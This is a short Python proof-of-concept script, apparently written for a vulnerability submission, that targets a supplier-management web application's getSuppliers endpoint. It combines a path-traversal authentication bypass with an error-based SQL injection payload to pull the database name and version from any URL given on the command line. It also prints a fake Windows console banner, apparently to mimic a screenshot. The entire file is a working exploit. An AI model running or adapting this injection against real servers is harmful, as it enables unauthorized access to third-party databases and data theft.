#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()

select_list = ["database()", "version()"]


def verify(site):
    headers = {
                'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
                'Upgrade-Insecure-Requests':'1',
                'Connection':'keep-alive',
                'Cache-Control':'max-age=0',
                'Accept-Encoding':'gzip, deflate, sdch',
                'Accept-Language':'zh-CN,zh;q=0.8',
                'Referer': site
    }
    urltemp = site + "/adpweb/static/%2e%2e;/a/srm/inquiry/getSuppliers?code=1%27+AND+GTID_SUBSET%28CONCAT%280x7e%2C%28SELECT+{}%29%2C0x7e%29%2C7973%29--+WkOF&name=1"
    for select in select_list:
        vulnurl = urltemp.format(select)
        try:
            r = requests.get(vulnurl, headers=headers, verify=False, timeout=10)
            #print(r.text)
            if "XPATH" in r.text:
                info = re.findall("'~([^']+)~'", r.text)
                if len(info) != 0:
                    return info[0], select
        except:
            pass
    return False, ""


if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 zhihulian-srm-getSuppliers-sqli.py ",target)
    info, payload = verify(target)
    if info != False:
        print("[+]漏洞存在，SQL 检测 paylaod: ", payload," 查询结果为：", info)
        sys.exit()
    else:
        print("[-]漏洞不存在：", payload)
